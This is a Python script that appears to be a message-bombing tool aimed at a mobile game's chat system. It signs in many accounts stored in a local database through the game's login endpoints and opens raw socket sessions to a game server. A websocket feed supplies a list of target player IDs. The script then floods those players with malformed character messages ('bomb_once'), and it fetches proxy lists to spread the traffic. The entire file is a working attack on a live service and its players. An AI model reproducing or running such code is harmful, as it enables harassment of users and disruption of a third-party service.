#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
import random
import asyncio
import socket
import sqlite3
import json
import sys
import traceback

import aiohttp
import requests

import socks
from lib import make_logon_data, get_proxies, del_proxy, make_send_msg_data, make_bad_msg_data, Session, init_data, make_create_role_data

headers = {
    "User-Agent": "Mozilla/5.0 (Linux; U; Android 9.0.1; en-us;) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1"
}
pool = []
# socket.socket = socks.socksocket

online = set()
attack_when = 20

def get_proxies2():
    proxies = requests.get("https://proxy.ishield.cn/?types=0&count={}".format(300)).json()
    proxies += requests.get("https://proxy.ishield.cn/?types=1&count={}".format(300)).json()
    return set("{} {}".format(proxy[0], proxy[1]) for proxy in proxies)

async def user_do(username, imei, passwd='V0\/wJekk6Kk=', proxy=None):
    # return user_id and session for login_verify api
    version = 'Android1.0.1'
    tpl = '{"uid":"","token":"","uName":"%s","nickName":"","password":"%s","version":"%s","imei":"%s","authCode":"","flag":1,"isfast":"0","thirdType":1,"thirdToken":"","thirdUid":"","fbBusinessToken":"","language":"Cn","appKey":"76749c0621384a96b744ccb089567bcf"}'
    j = tpl % (username, passwd, version, imei)
    url = 'http://haiwaitest.3333.cn:8008/sdk/user/user.do'
    async with aiohttp.ClientSession() as session:
        async with session.post(url, data=j, headers=headers, proxy=proxy, timeout=3) as resp:
            t = await resp.text()
            r = json.loads(t)
            assert r["code"] == 100
    return r['uid'], r['token']

async def login_verify(user_id, token, version='1.7.61848', proxy=None):
    # return tcp session
    url = 'http://sgz-login.fingerfunol.com:30006/entry_server/login_verify?version=%s&server_id=20&userid=%s&channel=4&session=%s&platform=a8card&isdebug=False&activation_code=' % (version, user_id, token)
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers, proxy=proxy, timeout=5) as resp:
            t = await resp.text()
            r = json.loads(t)
    return r['session']

def char_gen():
    blocks = [15708544, 15708800, 15709056, 15709312]
    random.shuffle(blocks)
    char = random.randint(blocks[0], blocks[0] + 63).to_bytes(3, byteorder="big")
    return char

async def heartbeat(writer):
    while True:
        await asyncio.sleep(10)
        try:
            writer.write(b'\x00\x00\x00\x02\x01\x00')
            await writer.drain()
        except:
            print(traceback.format_exc())
            break

async def ws_updater():
    global pool
    await asyncio.sleep(10)
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.ws_connect('http://localhost:7788/ws') as ws:
                    async for msg in ws:
                        if msg.type == aiohttp.WSMsgType.TEXT:
                            if msg.data == 'close cmd':
                                await ws.close()
                                break  # won't get here
                            else:
                                #print('get data', msg.data)
                                pool = list(json.loads(msg.data).keys())
                                random.shuffle(pool)
                        elif msg.type == aiohttp.WSMsgType.ERROR:
                            raise StandardError(aiohttp.WSMsgType.ERROR)
            except aiohttp.client_exceptions.ClientConnectorError:
                print("connection error, wait 5s")
                await asyncio.sleep(5)

async def read_bytes(reader, length):
    buf = b""
    while len(buf) < length:
        d = await reader.read(length - len(buf))
        if not d:
            raise BaseException("get null data!!!")
        buf += d
    return buf

async def read_one(reader):
    # read and process packages
    head = await read_bytes(reader, 4)
    body = await read_bytes(reader, int.from_bytes(head, byteorder="big"))
    return head, body


async def one(loop, email, wait=0):
    """maintance one bomb sender"""
    global online
    imei = "".join(str(random.randint(0,9)) for x in range(1, len("863272039030961")+1))
    version = "1.7.61848"
    uid, token, session = None, None, None
    #if wait:
    #    await asyncio.sleep(wait%10)
    while True:
        print("start:", email)
        try:
            if not uid or not token:
                uid, token = await user_do(email, imei)
            try:
                session = await login_verify(uid, token, version=version)
            except:
                # print("saved uid,token is expired")
                uid, token = await user_do(email, imei)
                session = await login_verify(uid, token, version=version)

            fut = asyncio.open_connection('128.14.236.49', 30000)
            reader, writer = await asyncio.wait_for(fut, timeout=3)
            writer.write(make_logon_data(version, uid, imei, session))
            head, body = await read_one(reader)
            r = init_data(body)
            # print(r)
            writer.write(b'\x00\x00\x00\x02\x01\x00')
            writer.write(b'\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x07\x00\x01\x00\x00\x00\x00\x07')
            asyncio.ensure_future(heartbeat(writer), loop=loop)
            bomb_times = 0
            bomb_record = dict()
            online.add(email)
            writer.drain()
            while True:
                i = 0
                threshold = 10
                targets = []
                now = time.time()
                for idx, receiver in enumerate(pool):
                    last_bomb_time = bomb_record.get(receiver, None)
                    if not last_bomb_time or now - last_bomb_time >= threshold:
                        targets.append(receiver)
                for receiver in targets[:4]:
                    await bomb_once(writer, receiver)
                    await bomb_once(writer, receiver)
                    await bomb_once(writer, receiver)
                    await bomb_once(writer, receiver)
                    await bomb_once(writer, receiver)
                    i += 1
                    bomb_record[receiver] = now
                # now everyone in pool has been bombed recently
                #if i:
                #    print(i, "in pool has been bombed. Total", len(pool))
                await asyncio.sleep(1)
            await asyncio.sleep(1)
        except BrokenPipeError:
            if email in online:
                online.remove(email)
            import traceback
            print(traceback.format_exc())
            print(email, "disconnected after", i, "turns")
        except:
            if email in online:
                online.remove(email)
            import traceback
            print("wtf!!!!", traceback.format_exc())
            await asyncio.sleep(3)


async def bomb_once(writer, target_id):
    receiver = int(target_id)
    writer.write(make_bad_msg_data(char_gen()*1, receiver, 4))
    writer.write(make_bad_msg_data(char_gen()*1, receiver, 5))
    writer.write(make_bad_msg_data(char_gen()*1, receiver, 6))
    writer.write(make_bad_msg_data(char_gen()*1, receiver, 7))
    writer.write(make_bad_msg_data(char_gen()*1, receiver, 8))
    await writer.drain()


async def count_down(sec):
    await asyncio.sleep(sec)
    exit()

if __name__ == "__main__":
    import sys
    x = int(sys.argv[1])
    count = 30
    loop = asyncio.get_event_loop()
    guards = []
    conn = sqlite3.connect("data.db")
    conn.isolation_level = None   # auto commit
    c = conn.cursor()
    c.execute("SELECT * FROM guards WHERE length(name)<=3 order by rowid LIMIT ?,?", ((x-1)*count, count))
    idx = 0
    for row in c.fetchall():
        idx += 1
        email = row[0]
        guards.append(one(loop, email, idx))
    guards += [ws_updater()]
    loop.run_until_complete(asyncio.gather(*guards))
    loop.close()
